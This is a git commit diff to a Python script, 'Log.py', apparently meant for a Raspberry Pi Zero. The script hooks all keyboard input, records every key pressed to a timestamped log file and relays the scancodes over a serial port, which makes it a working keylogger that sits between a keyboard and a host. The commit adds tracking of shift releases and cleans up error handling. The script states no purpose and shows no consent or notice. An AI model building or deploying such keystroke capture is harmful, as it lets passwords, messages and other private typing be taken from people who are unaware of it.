6c2b492af4bcaf770d28f8c0ae95857ec3e8d2af
Konstantin <turbo.foxy01@gmail.com>
2024-04-20 23:06:36 +0200

    (RShift) added to specify when shift has been released

--- files for RP zero/Log.py
+++ files for RP zero/Log.py
@@ -6,37 +6,39 @@ import threading
 import os
 import keyboard as k
 import datetime
-#from convert_keys_to_packets import convert_scancodes_to_packets
 import serial
+
 SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
 NULL_CHAR = chr(0)
+
 path_log = f"{SCRIPT_PATH}/Log.txt"
-
 serial_port = r'/dev/ttyS0'
-#def write_report(report):
-#    with open('/dev/hidg0', 'rb+') as fd:
-#        fd.write(report.encode())
-ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
-def on_key_event(e):
 
+ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
+
+shift_pressed = False
+def on_key_event(e):
+    global shift_pressed
 
     pressed_events = k._pressed_events
     print(pressed_events)
-    scancodes = [str(int(scancode_to_packet[event])) for event in pressed_events if pressed_events[event].event_type=="down"]
+    scancodes = [str(scancode_to_packet[event]) for event in pressed_events if pressed_events[event].event_type=="down"]
 
-    #package_to_send = convert_scancodes_to_packets(scancodes=scancodes)
     try:
+        if "225" in scancodes or "229" in scancodes:
+            shift_pressed = True
+        elif shift_pressed:
+            shift_pressed = False
+            with open(path_log, "a") as log:
+                log.write("(RShift)")
         if scancodes:
             ser.write((",".join(scancodes)+",\n").encode("utf-8"))
 
         else:
             ser.write("0,\n".encode("utf-8"))
 
-
-    except KeyboardInterrupt:
-        raise Exception("execution stopped")
-    except Exception as e:
-        print("couldn't send data", e)
+    except Exception as ex:
+        print("couldn't send data", ex)
 
     if e.event_type == k.KEY_DOWN:
 
@@ -44,13 +46,14 @@ def on_key_event(e):
         with open(path_log, "a") as log:
             try:
                 if len(e.name) > 1 and e.name != "space":
-                    log.write(f"[{e.name}]")
+                    log.write(f"({e.name})")
                 elif e.name == "space":
                     log.write(" ")
                 else:
                     log.write(e.name)
+
             except Exception as ex:
-                log.write(f"Error writing event to log: {str(ex)}")
+                print(f"Error writing event to log: {str(ex)}")
 
 
 
@@ -58,10 +61,14 @@ def setup():
     with open(path_log, "a") as log:
         log.write(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
 if __name__ == "__main__":
+        try:
+            setup()
 
-        setup()
 
 
-
-        k.hook(on_key_event)
-        k.wait()
+            k.hook(on_key_event)
+            k.wait()
+        except KeyboardInterrupt:
+            print("closing")
+            ser.write("0,\n".encode("utf-8"))
+            quit()
